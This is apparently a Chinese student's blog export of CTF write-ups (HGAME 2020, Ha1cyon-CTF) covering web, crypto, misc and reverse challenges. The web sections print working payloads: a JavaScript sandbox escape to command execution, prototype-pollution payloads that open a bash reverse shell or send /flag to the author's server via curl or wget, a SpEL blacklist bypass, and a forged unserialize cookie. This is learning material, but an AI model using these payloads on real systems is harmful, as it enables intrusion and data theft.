res.send(render(req.session.results));\n});\n\n// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI\napp.get('/source', function (req, res) {\n  res.set('Content-Type', 'text/javascript;charset=utf-8');\n  res.send(fs.readFileSync('./index.js'));\n});\n\napp.get('/', function (req, res) {\n  res.set('Content-Type', 'text/html;charset=utf-8');\n  req.session.admin = req.session.admin || 0;\n  res.send(render(req.session.results = req.session.results || []))\n});\n\napp.listen(80, '0.0.0.0', () => {\n  console.log('Start listening')\n});\n```\n出现\n>app.use(bodyParser.json());接收json请求\njson绕过  \n首先要满足\n>first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])\n```\n\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}\n```\n设定first与second的length值相等，本质上first和second在此时是不同的两个对象(地址不同)  \n而对于md5的相等,与string相加时会强制转换为string，而first与second的string值是相同的  \n之后尝试绕过\n```js\nfunction saferEval(str) { //e\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n>stringObject.replace(regexp/substr,replacement)\n>如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串\n对于\n```\n(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| \n```\n![](Ha1cyon-CTF/06.png)\n>\\w+匹配数字和字母下划线的多个字符\n通过原型链实现RCE  \n>无法直接输入字符串,Math.\\_\\_proto\\_\\_无法直接利用  \n[Arrow function expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)\n\n```py\ns = f\"return process.mainModule.require('child_process').execSync('cat /flag').toString()\"\na=','.join([str(ord(i)) for i in s])\nprint(a)\n```\npayload:\n```\n{\"e\":\"(Math=>(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)\",\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}}\n```\nMath+1=>Math+字符串得到一个string类型的对象(不能直接输入字符串)\n\n# misc\n## 抽象带师\n翻译成地球人文字即可\n\n# crypto\n## 这是什么觅🐎\n![](Ha1cyon-CTF/01.jpg)\n小字：F1 W1 S22 S21 T12 S11 W1 S13  \nS和T都是两位数其他都是一位数，日历表上以T，S开头的星期也正好有两个，所以猜测这个会与星期所关联    \n\n[日历密码](https://wenku.baidu.com/view/a01fc4f9f705cc17552709d1?qq-pf-to=pcqq.c2c)  \n根据👆即可解出calendar\n\n## Classical Cipher\n题目\n```\n压缩包密码：gsv_pvb_rh_zgyzhs\n\n对应明文：   ***_key_**_******\n```\n已知部分明文和全部密文求全部明文  \n'p'-'a'+'k'-'a'=25(对应关系)  \n![](Ha1cyon-CTF/02.png)\n猪圈密码+非斯的象形文字=>    \n原来猪圈密码是变形版的  \n\n\n","tags":["ctf"]},{"title":"hgame2020week4_wp","url":"/2020/02/18/hgame2020week4-wp/","content":"[hgame_official_wp](https://github.com/vidar-team/Hgame2020_writeup/blob/master/week4/HGAME%202020%20Week4%20Official%20Writeup.pdf)  \n\n感谢各位出题人的耐心解答！\n\n# web\n## sekiro\n\n题目提供了源码，结构是这样的  \n![](wp4_img/0sekiro.png)\n看起来应该是要读取flag中的内容  \n先看web\\routes\\index.js\n```javascript\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n从[浅析JavaScript原型链污染攻击](https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/) 可以得知源码中的merge和clone会触发原型链污染  \n```javascript\nrouter.post('/action', function (req, res) {\n  if (!req.session.sekiro) {\n    res.end(\"Session required.\")\n  }\n  if (!req.session.sekiro.alive) {\n    res.end(\"You dead.\")\n  }\n  var body = JSON.parse(JSON.stringify(req.body));\n  var copybody = clone(body)\n  if (copybody.solution) {\n    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)\n  }\n  res.end(\"提交成功\")\n})\n```\n发现此处调用了clone函数,在solution存在的情况下会调用Game.dealWithAttacks()，再在\\web\\utils查看具体内容  \n```javascript\nthis.dealWithAttacks = function (sekiro, solution) {\n        if (sekiro.attackInfo.solution !== solution) {\n            sekiro.health -= sekiro.attackInfo.attack\n            if (sekiro.attackInfo.additionalEffect) {\n                var fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n            }\n        }\n        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500\n        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0\n        if (sekiro.posture == 500 || sekiro.health == 0) {\n            sekiro.alive = false\n        }\n        return sekiro\n    }\n```\n发现\n```javascript\nvar fn = Function(\"sekiro\", sekiro.attackInfo.additionalEffect + \"\\nreturn sekiro\")\n                sekiro = fn(sekiro)\n```\n可以通过改变sekiro.attackInfo.additionalEffect的值，在调用fn时实现远程命令执行  \n可以发现条件是 sekiro.attackInfo.solution !== solution  \n而在attack中\n```javascript\nthis.attacks = [\n        {\n            \"method\": \"连续砍击\",\n            \"attack\": 1000,\n            \"additionalEffect\": \"sekiro.posture+=100\",\n            \"solution\": \"连续格挡\"\n        },\n        {\n            \"method\": \"普通攻击\",\n            \"attack\": 500,\n            \"additionalEffect\": \"sekiro.posture+=50\",\n            \"solution\": \"格挡\"\n        },\n        {\n            \"method\": \"下段攻击\",\n            \"attack\": 1000,\n            \"solution\": \"跳跃踩头\"\n        },\n        {\n            \"method\": \"突刺攻击\",\n            \"attack\": 1000,\n            \"solution\": \"识破\"\n        },\n        {\n            \"method\": \"巴之雷\",\n            \"attack\": 1000,\n            \"solution\": \"雷反\"\n        },\n    ]\n```\n通过原型链污染的条件，我们要在攻击没有additionalEffect属性时发送我们的payload  \n说实话不知道为啥老是接收不到数据...  \n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\": \"return e => { for (var a in {}){delete Object.prototype[a];} return global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/_ip/_port 0>&1\\\"')}\\n\"}}\n```\n```javascript\n{\"solution\":0,\"__proto__\":{\"additionalEffect\":\" return e => { for (var a in {}){delete Object.prototype[a];}global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function(){})\"\n}}\n```\n这俩我都失败了，但是学长试了第二个说是可以拿到flag的?感觉是我操作问题...  \n后来利用curl来执行命令终于成功了一次...  \npayload成功变成了这样  \n```javascript\n{\n    \"solution\":\"0\",\n    \"__proto__\":{\n        \"additionalEffect\":\"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')\"\n    }\n}\n```\n先访问/info /attack界面，确定攻击满足条件后，再post /action，发送payload，最后从apache日志里找access记录  \n但是这个对我来说也是看运气，试了N遍就成功了一次...后面再尝试的时候又收不到了...  \n\n# 赛后\n## web\n### ezJava\n出题人一开始给了俩网址提示\n[Code-Breaking Puzzles — javacon WriteUp](http://rui0.cn/archives/1015)\n[jolokia](https://jolokia.org/reference/html/protocol.html)\n再结合下题目\n![](wp4_img/5.png)\n打开是一个登录表单\n![](wp4_img/1.png)\n先猜一下username=admin，password=admin，正好是正确的  \n[Spring Boot Actuator 使用](https://www.jianshu.com/p/af9738634a21)\n[Attack Spring Boot Actuator via jolokia Part 1](https://www.anquanke.com/post/id/173262)\n根据上面这两篇文章以及提示，我们访问\nhttp://ezspel.hgame.wz22.cc/actuator/env\n正好看见application.yml\n```\n{\n            \"name\": \"applicationConfig: [classpath:/application.yml]\",\n            \"properties\": {\n                \"server.port\": {\n                    \"value\": 9997,\n                    \"origin\": \"class path resource [application.yml]:2:9\"\n                },\n                \"spring.application.name\": {\n                    \"value\": \"ezSpel\",\n                    \"origin\": \"class path resource [application.yml]:6:7\"\n                },\n                \"management.endpoint.shutdown.enabled\": {\n                    \"value\": false,\n                    \"origin\": \"class path resource [application.yml]:10:16\"\n                },\n                \"management.endpoint.jolokia.config.debug\": {\n                    \"value\": true,\n                    \"origin\": \"class path resource [application.yml]:13:16\"\n                },\n                \"management.endpoints.web.exposure.include\": {\n                    \"value\": \"info,jolokia,env\",\n                    \"origin\": \"class path resource [application.yml]:17:18\"\n                },\n                \"keywords.blacklist[0]\": {\n                    \"value\": \"java.+lang\",\n                    \"origin\": \"class path resource [application.yml]:21:7\"\n                },\n                \"keywords.blacklist[1]\": {\n                    \"value\": \"Runtime\",\n                    \"origin\": \"class path resource [application.yml]:22:7\"\n                },\n                \"keywords.blacklist[2]\": {\n                    \"value\": \"exec.*\\\\(\",\n                    \"origin\": \"class path resource [application.yml]:23:7\"\n                },\n                \"keywords.blacklist[3]\": {\n                    \"value\": \"getClass\",\n                    \"origin\": \"class path resource [application.yml]:24:7\"\n                },\n                \"keywords.blacklist[4]\": {\n                    \"value\": \"forName\",\n                    \"origin\": \"class path resource [application.yml]:25:7\"\n                },\n                \"user.username\": {\n                    \"value\": \"admin\",\n                    \"origin\": \"class path resource [application.yml]:28:13\"\n                },\n                \"user.password\": {\n                    \"value\": \"******\",\n                    \"origin\": \"class path resource [application.yml]:29:13\"\n                },\n                \"user.encParam1\": {\n                    \"value\": \"hgamehgamehgame{\",\n                    \"origin\": \"class path resource [application.yml]:30:14\"\n                },\n                \"user.encParam2\": {\n                    \"value\": \"spppelandjookiaa\",\n                    \"origin\": \"class path resource [application.yml]:31:14\"\n                }\n            }\n        },\n        {\n            \"name\": \"class path resource [application.yml]:class path resource [application.yml]\",\n            \"properties\": {\n                \"ezSpel\": {\n                    \"value\": \"\"\n                },\n                \"include\": {\n                    \"value\": \"info,jolokia,env\"\n                },\n                \"-\": {\n                    \"value\": \"forName\"\n                },\n                \"password\": {\n                    \"value\": \"******\"\n                },\n                \"web\": {\n                    \"value\": \"\"\n                },\n                \"username\": {\n                    \"value\": \"admin\"\n                },\n                \"blacklist\": {\n                    \"value\": \"\"\n                },\n                \"endpoint\": {\n                    \"value\": \"\"\n                },\n                \"endpoints\": {\n                    \"value\": \"\"\n                },\n                \"encParam2\": {\n                    \"value\": \"spppelandjookiaa\"\n                },\n                \"encParam1\": {\n                    \"value\": \"hgamehgamehgame{\"\n                },\n                \"application\": {\n                    \"value\": \"\"\n                },\n                \"keywords\": {\n                    \"value\": \"\"\n                },\n                \"management\": {\n                    \"value\": \"\"\n                },\n                \"enabled\": {\n                    \"value\": \"false\"\n                },\n                \"port\": {\n                    \"value\": \"9997\"\n                },\n                \"spring\": {\n                    \"value\": \"\"\n                },\n                \"debug\": {\n                    \"value\": \"true\"\n                },\n                \"shutdown\": {\n                    \"value\": \"\"\n                },\n                \"server\": {\n                    \"value\": \"\"\n                },\n                \"jolokia\": {\n                    \"value\": \"\"\n                },\n                \"exposure\": {\n                    \"value\": \"\"\n                },\n                \"config\": {\n                    \"value\": \"\"\n                },\n                \"user\": {\n                    \"value\": \"\"\n                },\n                \"name\": {\n                    \"value\": \"\"\n                }\n            }\n        }\n```\n由此我们可以知道blacklist和加密解密中的2个参数\n再访问\nhttp://ezspel.hgame.wz22.cc/actuator/jolokia/list\n我们再来搜一搜出题人的名字(jqy)很容易就找到了关键部分(开玩笑的，一开始是肉眼找的，看见encrypt的字样感觉比较敏感才找到的)\n![](wp4_img/2.jpg)\n根据出题人提供的两份资料，我们需要构造payload来执行命令读取flag，而加密与解密针对的是rememberMe，所以我们需要在其中替换rememberMe的值  \n先放出payload\n```\n{\n   \"type\":\"EXEC\",\n   \"mbean\":\"com.jqy.ezspel:Name=EncryptService\",\n   \"operation\":\"encrypt\",\n   \"arguments\":[\"hgamehgamehgame{\",\"spppelandjookiaa\",\"#{T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(ClassLoader).getSystemClassLoader().loadClass(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64\\\"})}\"]\n}\n```\n现在解释下第三个args  \n因为黑名单的限制，我们选择字符串拼接的方式绕过黑名单的检测，这里的黑名单比出题人提供的资料里增加了forName和getClass,这俩的作用是加载类,这里我们用ClassLoader代替，于是就有*ClassLoader.getSystemClassLoader().loadClass()*，为了转换为SpEL的形式，我们需要*#{T(ClassLoader).getSystemClassLoader().loadClass()}*  \n\n(照搬出题人原话)  \n关于invoke：  \n在Java中,方法可以当做Method类的一个对象来看待。  \n*a.print(b)==print.invoke(a,b)*  \nprint是个变量，定义为*Method print=A.class.getMethod(\"print);*  \n就是获取类A里面的这个print方法  \n\nflag在根目录下所以直接cat flag，base64编码是因为某些特殊字符可能无法显示  \n先进行加密，因为之后网站会对rememberMe的值进行自动解密，将以上payload以JSON形式post至http://ezspel.hgame.wz22.cc/actuator/jolokia\n此时vps是没有接收到数据的，因为现在只是对数据进行了一个加密处理，然后我们看一下response\n![](wp4_img/6.png)\nvalue所指的就是加密后的数据，我们把它放进cookie中的rememberMe中,然后直接GET访问http://ezspel.hgame.wz22.cc/\n就好，在我们的服务器上查看apache日志就可以看见base64编码后的flag\n\n### 代打出题人服务中心\n感觉这题是最难的- -  \n[official_wp](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week4)\n[HGAME 2020 Week 4 WEB”代打出题人服务中心” Writeup](https://www.gem-love.com/websecurity/1566.html)\n\n这个看见截包时的data是xml形式的，并且无回显，有想到可能是BlindXXE,但是呢- -我发现输入'<'时，返回的包会显示error(然而这里是我- -data数据不完整造成的)  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)  \n我的理解是要攻击内网所以要获得服务器的相关信息，信息保存在/etc/hosts中\n然后用php伪协议读取文件信息  \n[XML与xxe注入基础知识](https://www.cnblogs.com/backlion/p/9302528.html)  \n[总结下这几天批量xxe遇到的坑](https://wh0ale.github.io/2019/05/09/2019-5-9-%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%99%E5%87%A0%E5%A4%A9%E6%89%B9%E9%87%8Fxxe%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/)  \n[对于XXE漏洞的学习与实验复现记录](https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/)  \n应该是hitcon2017的babyfirst改的\n之前犯过一个小错误导致服务器接收不到信息- -，原因是没有把dtd文件放在根目录下，导致无法读取- -，这个问题本质是因为我还不理解这个payload是咋回事- -  \n \n```php\n<?php\nerror_reporting(0);\n\n$token = @$_GET['token'];\nif (!isset($token)) {\n    die(\"请带上您的队伍token访问! /?token=\");\n}\n$api = \"http://checker/?token=\".$token;\n$t = file_get_contents($api);\nif($t !== \"ok\") {\n    die(\"队伍token错误\");\n}\n\nhighlight_file(__FILE__);\n\n$sandbox = '/var/www/html/sandbox/'. md5(\"hgame2020\" . $token);;\n@mkdir($sandbox);\n@chdir($sandbox);\n\n$content = $_GET['v'];\nif (isset($content)) {\n    $cmd = substr($content,0,5);\n    system($cmd);\n}else if (isset($_GET['r'])) {\n    system('rm -rf ./*');\n}\n\n/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _\n  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |\n | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |\n  \\___ \\|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |\n  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|\n |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)\n                                    |/\n\n*/\n```\n[如何在命令长度受限的情况下成功get到webshell](https://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html)  \n\n= =这题还是没搞懂\n","tags":["vidar"]},{"title":"hgame2020week3_wp","url":"/2020/02/14/hgame2020week3-wp/","content":"这周qwq基本等于没有在写题...\n\n# web\n## 序列之争\n啊...原来是要得到  \n```php\nprivate $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n```\n这里的encryptKey QAQ  \n```php\nclass Game\n{   \n    private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct($playerName){\n        $_SESSION['player'] = $playerName;\n        if(!isset($_SESSION['exp'])){\n            $_SESSION['exp'] = 0;\n        }\n        $data = [$playerName, $this->encryptKey];\n        $this->init($data);\n        $this->monster = new Monster($this->sign);\n        $this->rank = new Rank();\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);\n            $this->sign .= md5($this->sign . $value);\n        }\n    }\n}\n```\n看了hint,传入player=%s以此来得到$encryptKey  \n```php\nclass Rank\n{\n    private $rank;\n    private $serverKey;     // 服务器的 Key\n    private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';\n\n    public function __construct(){\n        if(!isset($_SESSION['rank'])){\n            $this->Set(rand(2, 1000));\n            return;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        $this->rank = $no;\n    }\n\n    public function Get(){\n        return $this->rank;\n    }\n\n    public function Fight($monster){\n        if($monster['no'] >= $this->rank){\n            $this->rank -= rand(5, 15);\n            if($this->rank <= 2){\n                $this->rank = 2;\n            }\n\n            $_SESSION['exp'] += rand(20, 200);\n            return array(\n                'result' => true, \n                'msg' => '<span style=\"color:green;\">Congratulations! You win! </span>'\n            );\n        }else{\n            return array(\n                'result' => false, \n                'msg' => '<span style=\"color:red;\">You die!</span>'\n            );\n        }\n    }\n\n    public function __destruct(){\n        // 确保程序是跑在服务器上的！\n        $this->serverKey = $_SERVER['key'];\n        if($this->key === $this->serverKey){\n            $_SESSION['rank'] = $this->rank;\n        }else{\n            // 非正常访问\n            session_start();\n            session_destroy();\n            setcookie('monster', '');\n            header('Location: index.php');\n            exit;\n        }\n    }\n}\n\nclass Monster\n{\n    private $monsterData;\n    private $encryptKey;\n\n    public function __construct($key){\n        $this->encryptKey = $key;\n        if(!isset($_COOKIE['monster'])){\n            $this->Set();\n            return;\n        }\n\n        $monsterData = base64_decode($_COOKIE['monster']);\n        if(strlen($monsterData) > 32){//32是指md5的位数\n            $sign = substr($monsterData, -32);\n            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);\n            if(md5($monsterData . $this->encryptKey) === $sign){\n                $this->monsterData = unserialize($monsterData);\n            }else{\n                session_start();\n                session_destroy();\n                setcookie('monster', '');\n                header('Location: index.php');\n                exit;\n            }\n        }\n        \n        $this->Set();     \n    }\n\n    public function Set(){\n        $monsterName = ['无名小怪', 'BOSS: The Kernal Cosmos', '小怪: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch'];\n        $this->monsterData = array(\n            'name' => $monsterName[array_rand($monsterName, 1)],\n            'no' => rand(1, 2000),\n        );\n        $this->Save();\n    }\n\n    public function Get(){\n        return $this->monsterData;\n    }\n\n    private function Save(){\n        $sign = md5(serialize($this->monsterData) . $this->encryptKey);\n        setcookie('monster', base64_encode(serialize($this->monsterData) . $sign));\n    }\n}\n```\n```php\n  <main role=\"main\" class=\"inner cover\">\n    <h2 class=\"cover-heading\"><?php echo($game->welcomeMsg);?></h2>\n    <h1># <?php echo($game->rank->Get());?></h1>\n    <?php if($game->rank->Get() === 1){?>\n        <h2>hgame{flag_is_here}</h2>\n    <?php }?>\n    <br>\n    ```\n在Monster类里有反序列化函数unserialize(),而里面传入的内容是我们可以控制的cookie,所以可以通过这个函数来使得this->rank()==1。关于进入unserialize()之前所要达到的条件，其实执行一遍Monster类里Save()函数的内容就可以了:\n```php\n<?php\nerror_reporting(0);\nsession_start();\n\nclass Game\n{   \n    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct(){\n        $data = [1, $this->encryptKey];\n        $this->init($data);\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->sign .= md5($this->sign . $value);\n            \n        }\n        print($this->sign);\n    }\n}\n\nclass Rank\n{\n\n    private $rank;\n    public function __construct(){\n        $this->rank = $no;\n        if(!isset($_SESSION['rank'])){\n            $_SESSION['rank'] = 1;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        \n    }\n\n}\nnew Game();\n$res1=serialize(new Rank());\n//print($res1);\n$key='c4ca4238a0b923820dcc509a6f75849b4eb38c8d89d42dd45200003c8b7101c6';\n$sign = md5($res1 . $key);\nsetcookie('monster', base64_encode($res1 . $sign));\necho \"<br>\";\nprint($_COOKIE['monster']);\n?>\n```\n之后burpsuite拦截改cookie的值就可以了\n\n# misc\n## 三重隐写\n根据You konw LSB.wav先用silentEye把wav解码，出现key,用来解看起来很古风的mp3，得到flag.crypto，另一个mp3的图像是个条形码，在线解码一下。根据提供的工具，把条形码解码出的内容作为.crypto的key就可以得到flag\n\n# 赛后\n## web\n### 二发入魂\n官方wp给的资料(能读英文文章真是一项很重要的技能...)\n[BREAKING PHP'S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE](https://www.ambionics.io/blog/php-mt-rand-prediction)\n[中文翻译版](https://nosec.org/home/detail/3876.html)\n[reverse_mt_rand.py](https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py)\n脚本流程是，先访问https://twoshot.hgame.n3ko.co/random.php?times=228\n也就是抽卡228次\n之后利用上面的脚本，有如下\n```\npy -3 ./reverse_mt_rand.py randnum[0] randnum[227] 0 0\n```\n所产生的值就是seed，也就是cdkey\n利用os.popen()方法向https://twoshot.hgame.n3ko.co/verify.php\npost以上payload就可以得到返回结果\n\n### Cosmos的二手市场\n![](00.png)\n进行交易时容易形成条件竞争  \n那么我们先购入一件商品，在出售的时候形成条件竞争，在库存还未来得及变化的情况下将统一商品反复出售，之后写个脚本(不知道为啥用burpsuite钱还是没变化- -)\n[python：threading.Thread类的使用详解](https://blog.csdn.net/drdairen/article/details/60962439)\n脚本的构成是，对于buy和solve这两个行为定义两个函数，传入cookie值以及data(data中包含了commodity信息-code&amount)，后面利用threading.Thread类进行多线程(- -)  \n  \n  之后不打算写了- -很多题也有很详细的wp了，本质上我也是看wp复现的(是的就是这么菜)\n\n### Cosmos的留言板-2\n\n[sql盲注之时间盲注](https://www.lsablog.com/networksec/penetration/time-based-blind-sqli/)\n\n### Cosmos的聊天室2.0\nscript被过滤为空，双写绕过。输入后控制台发现异常\n```\nRefused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self'\". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.\n```\nkey word:CSP\n[CTF|有关CSP绕过的方法](https://zhuanlan.zhihu.com/p/94246164)","tags":["vidar"]},{"title":"hgame2020week2_wp","url":"/2020/02/14/hgame2020week2-wp/","content":"凉了啊凉了啊  \n# Reverse\n## babyPy\n下载文件是个字节码，手动翻译一下，大概是这个样子  \n[参考网址](https://anhkgg.com/python-bytecode/)  \n```Python\ntmp1=flag[::-1]\ntmp2=list(tmp1)\nfor i in range(1,len(tmp2)):\n\ttmp3=tmp2[i-1]^tmp2[i]       \n\ttmp2[i]=tmp3\n\nres=bytes(tmp2).hex\nprint(res)\n```\n根据异或公式，可得m[i]= cipher[i] ^ cipher[i-1]  \n于是有如下  \n```Python\ncipher=bytes().fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')\n_cipher=list(cipher)\nm=b'}                                        '\n_m=list(m)\nfor i in range(1,len(_cipher)):\n\ttmp=_cipher[i]^_cipher[i-1]\n\t_m[i]=tmp\nflag=bytes(_m[::-1])\nprint(flag)\n```\n# Crypto\n## Verfication_code\n由源码得sha256(xxxx+已知字符串)=已知密文，爆破求xxxx，输入后再输入I like playing Hgame\n```Python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socketserver\nimport os, sys, signal\nimport string, random\nfrom hashlib import sha256\nimport itertools\n\nmyStr='L0ZzlogdBWx1hlXC'\ndstDigest='236abe814ce3691e1d5959bd36b79ca31e3d31b6daf941fa60d2fb7f9a01b61d'\n\nfor i in itertools.permutations(string.ascii_letters+string.digits,4):\n\tproof=''.join(i)+myStr\n\tdigest=sha256(proof.encode()).hexdigest()\n\tif(digest==dstDigest):\n\t\tprint(i)\n```\n# Misc\n## Cosmos的午餐\n(感谢出题人的耐心解答)  \n一开始以为在流量包里找png或者jpeg之类的，但是相关的提取出来感觉不太对劲...（根据题目图片应该是二次元妹子...)  \n先把log导入解密，在http中找，发现一个比较不一样的包  \n![](wp2_img/01.png)\n点进去看看发现含有zip文件格式，导出来看下里边有张图片，提示用outguess，并且备注里给了key，然后解密下就好，解完了是个网址，下载下来一个压缩包，里边的图片二维码扫一下就行\n## 所见即为假\n发现7z可以直接解压，注释中的F5 key提示了F5隐写，于是利用F5-steganography\n```\njava Extract ./11.jpg -e res -p NllD7CQon6dBsFLr\n```\n得到hex文本，复制进winhex可得flag\n## 地球上最后的夜晚\n解压得no password.pdf，想到pdf隐写，用wbStego4.3open解码得到一个txt文件，里边写着zip的解压密码，解压得一个doc文件，试试转成xml，用7z对doc解压后进入word文件夹，发现secret.xml，打开就是flag\n## 玩玩条码\n下载得一个zip，里边注释:Decode JPNPostCode to get MSUStegoVideo password  \n俩文件对应注释里边内容，先看postcode，这是个日本的邮政编码，我是在生成条码网站上手动对比，一个个试的，不过也不复杂，有规律    \n[日本邮政条形码生成器](https://cn.online-qrcode-generator.com/japanpost-barcode-generator)  \n![](wp2_img/00.png)\n第二个，根据提示下了virtualdub2，再安MSU StegoVideo 插件，这个只能运行32位的，打开后根据网上教程，输入上一步骤所得的码进行解码，[使用 MSU StegoVideo](https://blog.csdn.net/wy_bk/article/details/85217583)  \n打开txt文件可得zip密码，7z解压后得条形码，在线扫一下就好\n[Free Online Barcode Reader](https://online-barcode-reader.inliteresearch.com/)  \n# 赛后复现\n## web\n### Cosmos的博客后台\n看到http://cosmos-admin.hgame.day-day.work/?action=login.php\n这样的字样，想到可能是php伪协议  \n[文件包含漏洞与php伪协议](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)  \n于是输入http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\n解码后得到源码\n```php\n<?php\ninclude \"config.php\";\nsession_start();\n\n//Only for debug\nif (DEBUG_MODE){\n    if(isset($_GET['debug'])) {\n        $debug = $_GET['debug'];\n        if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) {\n            die(\"args error!\");\n        }\n        eval(\"var_dump($$debug);\");\n    }\n}\n\nif(isset($_SESSION['username'])) {\n    header(\"Location: admin.php\");\n    exit();\n}\nelse {\n    if (isset($_POST['username']) && isset($_POST['password'])) {\n        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){\n            $_SESSION['username'] = $_POST['username'];\n            header(\"Location: admin.php\");\n            exit();\n        }\n        else {\n            echo \"用户名或密码错误\";\n        }\n    }\n}\n?>\n```\n可以注意到\n```\neval(\"var_dump($$debug);\");\n```\neval()与$$debug都是需要注意的点  对于$$debug来说,在这里我们的$$debug就是可变变量,在这里$$debug就表示$($debug的值),同时$GLOBALS — 引用全局作用域中可用的全部变量,想着$GLOBALS能打印出我们所需要的username与password,于是传入\n```\nhttp://cosmos-admin.hgame.day-day.work/?action=login.php&debug=GLOBALS\n```\n出现\n![](wp2_img/02.png)\n从\n```\n$admin_password == md5($_POST['password']) \n```\n可以知道这是一个弱比较，所以我们只要传入md5开头是0e的字符串,0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0  \n成功登入之后再看下admin.php的源码\n```php\n<?php\ninclude \"config.php\";\nsession_start();\nif(!isset($_SESSION['username'])) {\n    header('Location: index.php');\n    exit();\n}\n\nfunction insert_img() {\n    if (isset($_POST['img_url'])) {\n        $img_url = @$_POST['img_url'];\n        $url_array = parse_url($img_url);\n   